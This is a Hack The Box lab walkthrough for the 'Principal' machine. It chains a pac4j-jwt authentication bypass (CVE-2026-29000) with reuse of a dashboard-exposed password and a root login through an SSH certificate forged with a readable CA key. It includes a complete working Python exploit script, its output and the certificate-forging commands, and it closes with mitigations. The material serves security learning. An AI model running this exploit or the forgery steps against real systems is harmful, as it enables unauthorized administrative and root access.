---
title: "HTB Walkthrough: Principal"
date: 2026-04-14
draft: false
description: "Full walkthrough of the Principal machine from Hack The Box. Medium difficulty, Linux (Ubuntu 24.04 LTS). CVE-2026-29000 JWT bypass via PlainJWT inside JWE, exposed credentials in the admin dashboard, and privilege escalation via SSH Certificate Forgery using the server's readable CA private key."
images: ["https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/a3257c109bddf7358350a2cf02b8ae81.png"]
tags: ["HackTheBox", "Linux", "Medium", "JWT", "JWE", "SSH", "CVE-2026-29000", "pac4j", "PrivEsc", "CertificateForge", "principal", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Step-by-step walkthrough of **Principal** on Hack The Box. **Medium** difficulty machine running **Linux (Ubuntu 24.04 LTS)**. We chain a JWT authentication bypass via CVE-2026-29000, credential extraction from an admin dashboard, and privilege escalation to root by forging an SSH certificate with the server's private CA key.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Medium{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                                               |
|----------------|----------------------------------------------------------------------|
| **Name**       | Principal                                                            |
| **OS**         | Linux (Ubuntu 24.04 LTS)                                             |
| **Difficulty** | Medium                                                               |
| **IP**         | 10.129.244.220                                                       |
| **Techniques** | CVE-2026-29000 · PlainJWT Bypass · SSH Certificate Forgery · Credential Exposure |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.244.220
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

Only two ports. We run a version scan on them:

```bash
nmap -sC -sV -p22,8080 10.129.244.220
```

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
8080/tcp open  http-proxy Jetty
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
| X-Powered-By: pac4j-jwt/6.0.3
```

*Open ports:*
- `22` → OpenSSH 9.6p1 (no relevant CVEs — final destination, not entry point)
- `8080` → Jetty with **pac4j-jwt/6.0.3**

> **💡 Key detail:** The `X-Powered-By: pac4j-jwt/6.0.3` header is information disclosure — it reveals the authentication library and its exact version, letting us look up CVEs directly. Always check HTTP response headers during enumeration.

### 1.2 Web Enumeration

Navigating to `http://10.129.244.220:8080` we find a corporate login form. Without credentials, we analyze what's publicly available.

Client-side JS files are an important intelligence source: developers frequently leave endpoints, data structures, and comments that describe the internal architecture. The `/static/js/app.js` file reveals everything we need:

```js
const JWKS_ENDPOINT      = '/api/auth/jwks';  // RSA public key — public access
const AUTH_ENDPOINT      = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const SETTINGS_ENDPOINT  = '/api/settings';

const ROLES = {
    ADMIN:   'ROLE_ADMIN',
    MANAGER: 'ROLE_MANAGER',
    USER:    'ROLE_USER'
};

// Token handling:
//   - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
//   - Public key available at /api/auth/jwks for token verification
//   - Inner JWT is signed with RS256
//
// JWT claims schema:
//   sub  - username
//   role - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
//   iss  - "principal-platform"
```

### 1.3 Authentication Architecture

The system uses **JWE** (JSON Web Encryption), which is an encrypted JWT. The structure is:

```
JWE (outer layer — RSA-OAEP-256 encryption with server's public key)
  └── JWT signed with RS256 (inner layer — the actual claims: user, role, etc.)
```

This implies two separate operations: first the server decrypts the JWE, then verifies the inner JWT's signature. This separation is exactly what the CVE exploits.

The RSA public key is available without authentication at `/api/auth/jwks`:

```bash
curl http://10.129.244.220:8080/api/auth/jwks
```

```json
{
  "keys": [{ "kty": "RSA", "use": "enc", "kid": "enc-key-1", "n": "0vx7ago...", "e": "AQAB" }]
}
```

This key lets us encrypt the JWE layer ourselves — the server can decrypt it (it has the private key), but the JWT we place inside is under our control.

> **💡 Conclusions:** We have the RSA public key to encrypt tokens, we know the exact claims structure, and we know the `role` field controls access. If we can get the server to accept a token with `ROLE_ADMIN` without verifying the inner JWT's signature, we have full access.

---

## 2. Exploitation — CVE-2026-29000

### 2.1 Vulnerability Analysis

**pac4j-jwt 6.0.3** is vulnerable to this CVE (affects versions before 4.5.9, 5.7.9, and 6.3.3). The flaw is in how pac4j processes JWE tokens when the inner JWT is a **PlainJWT** (`"alg": "none"` — unsigned).

**How the attack works:**

Under normal conditions, pac4j decrypts the JWE and then verifies the inner JWT's signature. The bug occurs when the inner JWT has `alg: none`: the `toSignedJWT()` function returns `null` instead of throwing an exception, and the calling code doesn't check that `null` before continuing. The result is that pac4j extracts claims from the PlainJWT **without having verified any signature**, accepting whatever `role` the attacker placed there.

```
Normal flow:    valid JWE → RS256-signed JWT → verify signature → extract claims
Malicious flow: valid JWE → PlainJWT (alg:none) → toSignedJWT() = null → claims accepted without verification
```

The key to the bypass: we encrypt the JWE layer with the **server's real public key**, so the outer decryption is completely valid. The problem is in the inside.

### 2.2 Exploit Script

Exploit available at: [CVE-2026-29000 PoC](https://github.com/advisories/CVE-2026-29000)

```bash
pip install jwcrypto requests
```

```python
#!/usr/bin/env python3
"""
CVE-2026-29000 — pac4j-jwt PlainJWT Authentication Bypass
Usage: python3 cve.py http://10.129.244.220:8080
"""

import json, time, base64, requests, sys
from jwcrypto import jwk, jwe

TARGET_URL         = sys.argv[1].rstrip('/')
JWKS_ENDPOINT      = f"{TARGET_URL}/api/auth/jwks"
PROTECTED_ENDPOINT = f"{TARGET_URL}/api/dashboard"

def b64_encode(data):
    # URL-safe Base64 without padding — format required by the JWT standard
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# 1. Fetch the RSA public key from the public endpoint
print(f"[*] Fetching public key from {JWKS_ENDPOINT}...")
r = requests.get(JWKS_ENDPOINT, timeout=10)
key_data   = r.json()['keys'][0]
public_key = jwk.JWK(**key_data)
print(f"[+] RSA key '{key_data.get('kid')}' loaded.")

# 2. Malicious claims with ROLE_ADMIN
now = int(time.time())
claims = {
    "sub":  "admin#override",
    "role": "ROLE_ADMIN",           # The claim that gives us full access
    "iss":  "principal-platform",   # Must match what the server expects
    "iat":  now,
    "exp":  now + 3600
}

# 3. Build the PlainJWT (alg: none — no signature)
# Format: base64(header).base64(payload).
# The trailing empty dot indicates absence of signature
header_plain     = b64_encode(json.dumps({"alg": "none"}).encode())
payload_plain    = b64_encode(json.dumps(claims).encode())
plain_jwt_string = f"{header_plain}.{payload_plain}."

# 4. Wrap the PlainJWT in a JWE encrypted with the server's real public key
# The outer layer is cryptographically valid — the server can decrypt it.
# But the inner JWT has no signature: here's the bypass.
jwe_header = {
    "alg": "RSA-OAEP-256",
    "enc": "A256GCM",
    "cty": "JWT",           # Tells the server the decrypted content is a JWT
    "kid": key_data.get('kid')
}
jwe_obj = jwe.JWE(
    plain_jwt_string.encode(),
    recipient=public_key,
    protected=json.dumps(jwe_header)
)
malicious_token = jwe_obj.serialize(compact=True)
print("[+] Malicious JWE token generated.")

# 5. Send the token to the protected endpoint
headers = {"Authorization": f"Bearer {malicious_token}"}
resp    = requests.get(PROTECTED_ENDPOINT, headers=headers)

print(f"\n[!] TOKEN FOR THE BROWSER:\n{malicious_token}\n")
print(f"Status: {resp.status_code}")
if resp.status_code == 200:
    print("[!!!] BYPASS SUCCESSFUL — Access as ADMIN")
    print(resp.text)
```

### 2.3 Execution

```bash
python3 cve.py http://10.129.244.220:8080
```

```
[*] Fetching public key from http://10.129.244.220:8080/api/auth/jwks...
[+] RSA key 'enc-key-1' loaded.
[+] Malicious JWE token generated.

Status: 200
[!!!] BYPASS SUCCESSFUL — Access as ADMIN
```

The dashboard response includes the system activity log. Among the entries we find:

```json
{
  "action": "CERT_ISSUED",
  "username": "svc-deploy",
  "details": "SSH certificate issued for deploy-1735400000",
  "timestamp": "2026-03-05T21:43:40.443553"
}
```

The `svc-deploy` user manages SSH authentication via certificates — a direct candidate for initial access.

### 2.4 Browser Dashboard Access

To explore the interface as admin, we inject the token into the browser's Session Storage (where the SPA stores the session token):

1. Open `http://10.129.244.220:8080/login` → **F12** → **Application** → **Session Storage**
2. Create entry: **Key** `auth_token` / **Value** (paste the token from the script)
3. Navigate to `http://10.129.244.220:8080/dashboard`

In the **Settings** section we find system credentials in cleartext:

```
encryptionKey: D3pl0y_$$H_Now42!
sshCertAuth:   enabled
sshCaPath:     /opt/principal/ssh/
```

> **🔑 Matching the `svc-deploy` user from the log with the Settings password gives us direct SSH credentials.**

---

## 3. User Flag

```bash
ssh svc-deploy@10.129.244.220
# Password: D3pl0y_$$H_Now42!
```

```
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
svc-deploy@principal:~$
```

```bash
svc-deploy@principal:~$ cat user.txt
```

> 🔑 User flag obtained.

---

## 4. Privilege Escalation

### 4.1 System Enumeration

```bash
svc-deploy@principal:~$ sudo -l
Sorry, user svc-deploy may not run sudo on principal.

svc-deploy@principal:~$ id
uid=1001(svc-deploy) gid=1001(svc-deploy) groups=1001(svc-deploy),1002(deployers)
```

No `sudo`, but the user belongs to the `deployers` group. We look for resources accessible to that group:

```bash
svc-deploy@principal:~$ find / -group deployers 2>/dev/null
```

```
/etc/ssh/sshd_config.d/60-principal.conf
/opt/principal/ssh
/opt/principal/ssh/README.txt
/opt/principal/ssh/ca          ← SSH CA private key
```

The `/opt/principal/ssh/ca` file is an **SSH Certificate Authority private key** readable by our group. This is critical.

### 4.2 SSH Configuration Analysis

SSH can authenticate users via **certificates** signed by a CA. The server defines in its configuration which CA to trust, and accepts connections from any user whose certificate was signed by it. Whoever controls the CA's private key can sign certificates for **any user on the system**, including `root`.

```bash
svc-deploy@principal:~$ cat /etc/ssh/sshd_config.d/60-principal.conf
```

```
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

- **`TrustedUserCAKeys /opt/principal/ssh/ca.pub`** → The server trusts any certificate signed by this CA. We have read access to the corresponding private key.
- **`PermitRootLogin prohibit-password`** → Root can't authenticate with a password, but **can with a certificate**.

The critical misconfiguration is the **absence of `AuthorizedPrincipalsFile`**. Without it, the only access control is that the certificate's *principal* (the field declaring "this certificate is for user X") matches the user being connected to. There's no list restricting which principals are valid for each account — if we sign a certificate with `root` as principal, SSH accepts it.

> **💡 Same pattern as the CVE:** the system verifies the cryptographic envelope (the certificate is signed by the trusted CA), but doesn't control the inner identity assertion (the certificate's principal). In both attack vectors on this machine, verifying the outer layer creates a false sense of security.

### 4.3 SSH Certificate Forgery

**Step 1 — Generate a temporary key pair:**

```bash
svc-deploy@principal:/tmp$ ssh-keygen -t ed25519 -f /tmp/paw -N ""
```

We generate the keys in `/tmp` with an empty passphrase to avoid interaction.

**Step 2 — Sign the public key with the CA private key, specifying `root` as principal:**

```bash
svc-deploy@principal:/tmp$ ssh-keygen -s /opt/principal/ssh/ca \
    -I "pwa-root" \
    -n root \
    -V +1h \
    /tmp/paw.pub
```

- **`-s /opt/principal/ssh/ca`** → The CA's private key. Without this file, escalation would be impossible.
- **`-I "pwa-root"`** → Certificate identifier (arbitrary, appears in logs).
- **`-n root`** → **The certificate's principal.** Declares this certificate authorizes access to `root`. Without `AuthorizedPrincipalsFile`, SSH accepts this claim without additional restrictions.
- **`-V +1h`** → 1 hour validity.

```
Signed user key /tmp/paw-cert.pub: id "pwa-root" serial 0 for root valid from 2026-04-14T09:51:00 to 2026-04-14T10:51:59
```

**Step 3 — Verify the certificate:**

```bash
svc-deploy@principal:/tmp$ ssh-keygen -L -f /tmp/paw-cert.pub
```

```
/tmp/paw-cert.pub:
        Type: ssh-ed25519-cert-v01@openssh.com user certificate
        Signing CA: RSA SHA256:bExSfFTUaopPXEM+lTW6QM0uXnsy7CICk0+p0UKK3ps
        Key ID: "pwa-root"
        Valid: from 2026-04-14T09:51:00 to 2026-04-14T10:51:59
        Principals:
                root
        Extensions:
                permit-pty
                permit-port-forwarding
                ...
```

The certificate is signed by the correct CA and declares `root` as principal.

**Step 4 — Connect as root:**

```bash
svc-deploy@principal:/tmp$ ssh -i /tmp/paw root@localhost
```

SSH automatically detects the certificate `/tmp/paw-cert.pub`. The server verifies it's signed by the trusted CA, that the principal `root` matches the requested user, and opens the session.

```
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
root@principal:~#
```

✅ **Root obtained via forged SSH certificate.**

---

## 5. Root Flag

```bash
root@principal:~# cat /root/root.txt
```

> 🏁 Root flag obtained.

---

## 6. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → `X-Powered-By: pac4j-jwt/6.0.3` — direct information disclosure to CVE.
2. **Web enumeration** → Frontend JS reveals JWE/JWT architecture, public JWKS endpoint, and claims structure.
3. **CVE-2026-29000** → PlainJWT (`alg:none`) inside a valid JWE bypasses signature verification → `ROLE_ADMIN`.
4. **Dashboard** → Log reveals `svc-deploy` user; Settings exposes password in cleartext.
5. **Foothold** → SSH with direct credentials → `user.txt`.
6. **PrivEsc** → `deployers` group has read access to the SSH CA private key + `TrustedUserCAKeys` without `AuthorizedPrincipalsFile` → forged certificate with `root` as principal → `root.txt`.

**What I learned from this machine:**

- **HTTP headers reveal a lot.** `X-Powered-By` with exact version is the starting point for the entire chain. Always check response headers during enumeration.

- **Frontend JS is not decoration.** The developer's comments described the entire authentication architecture. Everything served to the browser can be read by the attacker.

- **CVE-2026-29000: the "fail securely" principle.** The bug isn't cryptographic — RSA-OAEP and AES-GCM are secure. The flaw is that `toSignedJWT()` returns `null` silently on a PlainJWT instead of throwing an exception. A secure system must deny access on any anomalous condition, never grant it by default.

- **`TrustedUserCAKeys` without `AuthorizedPrincipalsFile` is a time bomb.** The first directive defines who can sign trusted certificates; the second limits which identities are valid for each user. Without the second, anyone with the CA private key can access any user on the system.

- **`PermitRootLogin prohibit-password` doesn't protect against certificates.** It only blocks password brute-force. The correct protection is `PermitRootLogin no` + audited `sudo`.

- **Secrets must never be in the UI.** The password visible in the dashboard Settings is the mistake that turns an auth bypass into full system access. Secrets should live in a vault (HashiCorp Vault, AWS Secrets Manager), never in the application database.

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| Information disclosure (`X-Powered-By`) | Remove or generalize headers that reveal technology and version |
| CVE-2026-29000 (PlainJWT bypass) | Update pac4j-jwt to ≥ 6.3.3; explicitly reject `alg: none` |
| Unrestricted JWKS | Protect `/api/auth/jwks` by IP or with authentication |
| Cleartext credentials in the UI | Use a secrets manager; never expose values in the interface |
| CA private key readable by service group | Store in HSM or vault; no read permissions for service accounts |
| `TrustedUserCAKeys` without `AuthorizedPrincipalsFile` | Configure `AuthorizedPrincipalsFile` limiting principals per user; no valid principals for `root` |
| `PermitRootLogin prohibit-password` | Change to `PermitRootLogin no` + root access management via audited `sudo` |
